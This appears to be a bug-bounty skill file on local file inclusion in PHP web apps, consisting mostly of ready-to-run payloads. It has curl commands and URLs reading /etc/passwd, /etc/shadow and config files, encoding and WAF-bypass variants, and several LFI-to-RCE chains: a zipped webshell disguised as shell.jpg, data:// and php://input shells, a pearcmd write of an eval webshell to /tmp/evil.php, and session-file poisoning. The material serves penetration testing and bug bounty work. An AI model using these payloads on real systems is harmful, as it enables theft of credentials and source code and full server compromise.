---
name: "local-file-inclusion"
version: "2.1"
category: "injection"
subcategory: "lfi"
phase: "exploitation"
tags: ["bug-bounty", "injection", "lfi", "path-traversal", "php-wrapper"]
tools: ["ffuf", "burp-intruder", "seclists", "dotdotpwn", "phpggc"]
follow_up_skills: ["rce", "path-traversal", "remote-code-execution", "information-disclosure-harvesting", "exposed-source-code-recovery"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: local file inclusion - exploitation phase, injection category"
---
# Local File Inclusion (LFI)

## Summary

Local File Inclusion is an attack technique where attackers trick a web application into exposing or executing arbitrary files on the web server. It occurs when user-supplied input is used to dynamically include files without proper sanitization.

## Key Concepts

- **Path Traversal**: Using `../` sequences to navigate outside the web root directory
- **PHP Wrappers**: PHP stream protocols (`php://filter`, `php://input`, `data://`, `zip://`, `expect://`) that allow reading or executing files in non-standard ways
- **Encoding Bypasses**: URL encoding, double encoding, UTF-8 encoding to bypass WAF/filter restrictions
- **Null Byte Injection**: Historically used to truncate file extensions in PHP < 5.3.4
- **Path Truncation**: Exploiting filesystem path length limits in PHP < 5.2

## Where to Find

Any endpoint that includes a file from the web server based on user input:

- `/index.php?page=index.html`
- `/?file=about.php`
- `/template.php?template=default`
- `/load.php?lang=en`

## Methodology

1. Identify dynamic file inclusion parameters (page, file, template, lang, include, path, doc, etc.).
2. Test basic path traversal to read `/etc/passwd` — confirms LFI exists.
3. If blocked by filters or WAF, cycle through encoding bypasses (URL encode, double encode, UTF-8).
4. If targeting PHP, test PHP wrappers:
   - `php://filter` for reading source code
   - `data://` or `php://input` for RCE
   - `zip://` for uploading and executing a zip archive
5. Test null byte injection (`%00`) on legacy PHP systems.
6. Test path truncation if PHP < 5.2.
7. If RCE is achieved via wrappers, execute system commands to confirm impact.

## Detection Commands

```bash
# Basic detection — try to read /etc/passwd
curl -s 'http://target.com/index.php?page=../../../etc/passwd'
curl -s 'http://target.com/index.php?page=../../../../../../../../../../../../etc/shadow'

# URL-encoded path traversal
curl -s 'http://target.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'

# Double encoding
curl -s 'http://target.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd'

# PHP filter — read source code (base64-encoded)
curl -s 'http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php'

# PHP filter — read with rot13 (bypasses keyword filters)
curl -s 'http://target.com/index.php?page=php://filter/read=string.rot13/resource=config.php'

# PHP filter — compressing for WAF evasion
curl -s 'http://target.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow'
```

## Exploitation Payloads

### Basic Path Traversal

```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow
```

### URL Encoding

```
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double Encoding

```
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### UTF-8 / Overlong Encoding

```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Null Byte (%00) Injection — PHP < 5.3.4

```
http://example.com/index.php?page=../../../etc/passwd%00
```

### From an Existing Folder

```
http://example.com/index.php?page=scripts/../../../../../etc/passwd
```

### Path Truncation — PHP < 5.2

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
```

### PHP Filter Wrappers

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
```

### PHP ZIP Wrapper — RCE via Uploaded ZIP

```bash
echo "<?php system(\$_GET['cmd']); ?>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg
rm payload.php
```

```
http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

### PHP Data Wrapper — RCE (Base64-encoded PHP)

```
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### PHP Expect Wrapper — RCE (requires expect extension)

```
http://example.com/index.php?page=expect://ls
```

### pearcmd Trick — RCE via PEAR (PHP 7/8, if PEAR installed)

PEAR's `pearcmd.php` (installed with many PHP builds) accepts a `+config-create+` argument that writes a file — combine with `register_argc_argv` for a file-write gadget. Works when you can only include local files (e.g., WordPress plugin/theme `file=` params):

```
# First write a webshell via pearcmd, then include it
http://example.com/index.php?page=../../../../usr/share/php/pearcmd&+config-create+/<?=eval($_GET[1]);?>+/tmp/evil.php
http://example.com/index.php?page=../../../../tmp/evil.php&1=system('id');
```

### LFI → RCE via PHP Session Files

If `session.save_path` defaults to `/tmp`, the session file contains your session data — inject PHP code via a session variable, then include the session file:

```
# Set a session var containing PHP (e.g., via a "lang" parameter reflected into session)
http://example.com/index.php?page=../../../../tmp/sess_<session-id>
# then include /tmp/sess_<session-id>
```

### PHP Input Wrapper — RCE

```
POST /index.php?page=php://input&cmd=ls HTTP/1.1
Host: example.com
...

<?php echo shell_exec($_GET['cmd']); ?>
```

### Unique Bypasses

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
http://example.com/index.php?page=/.%2e/.%2e/.%2e/.%2e/etc/passwd
http://example.com/index.php?page=/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
```

## Commands

```bash
# Create a PHP payload, zip it, and rename to jpg for upload
echo "<?php system(\$_GET['cmd']); ?>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg
```

## Tools

- **Burp Suite** — Fuzzing path traversal payloads across parameters
- **ffuf** — Brute-force LFI parameters and paths
- **dotdotpwn** — Automated path traversal fuzzing tool
- **LFISuite** — LFI scanner with auto-RCE via wrappers

## Bypass Techniques

- **URL Encoding**: Encode `../` as `%2e%2e%2f`
- **Double Encoding**: Encode `../` as `%252e%252e%252f` (bypasses single-decode filters)
- **UTF-8 Overlong Encoding**: `%c0%ae%c0%ae/` for `.` bypass (patched in modern PHP)
- **Null Byte Injection**: `%00` to strip appended extensions (PHP < 5.3.4)
- **Path Truncation**: Adding `/.` repeatedly to hit filesystem path limit (PHP < 5.2)
- **Nested Traversal**: `....//` as alternative to `../`
- **Forward Slash Overflow**: `..///////..////..//////etc/passwd`
- **Backslash Mixed**: `/%5C../%5C../%5C../etc/passwd` on Windows targets
- **Partial Encoding**: `/.%2e/.%2e/.%2e/etc/passwd`
- **Double Percent Encoding**: `%%32%65%%32%65` for WAF rules that decode only once

## Not a Finding If

- **Reflected input without file inclusion**: The parameter reflects the input but does not actually include a server-side file. Confirm by reading `/etc/passwd` — any response must contain actual passwd file content.
- **Error message reveals path but no inclusion**: A 404 or error disclosing the file path is information disclosure, not LFI.
- **WAF blocks all payloads**: A WAF returning 403 does not mean the vulnerability is absent — test other parameters, methods, or encoding bypasses.
- **Using `allow_url_include = Off`**: The `php://input` and `data://` wrappers require `allow_url_include` to be enabled. If disabled, these wrappers won't work, but local file reading via `php://filter` may still be exploitable.

## Notes

- Always try `php://filter/convert.base64-encode/resource=` first — it reads source code without executing it and works even when `allow_url_include` is Off.
- LFI can often be escalated to RCE via log poisoning (Apache/Nginx logs), `/proc/self/environ`, or PHP session files combined with `php://input`.
- **pearcmd trick**: `+config-create+/<?=eval($_GET[1]);?>+/tmp/evil.php` writes a shell via PEAR's `pearcmd.php` on PHP 7/8 when PEAR is installed — a reliable LFI→RCE path that bypasses `allow_url_include=Off`.
- PHP session files in `/tmp/sess_<id>` execute PHP when included — inject code through any parameter reflected into session data.
- If the app prepends a directory (e.g., `include("lang/$lang.php")`), wrappers may still work — try `php://filter/convert.base64-encode/resource=../config`.
- `/etc/shadow` usually requires root privileges — try `/etc/passwd` first.
- The null byte (`%00`) technique was patched in PHP 5.3.4 and no longer works on modern systems.
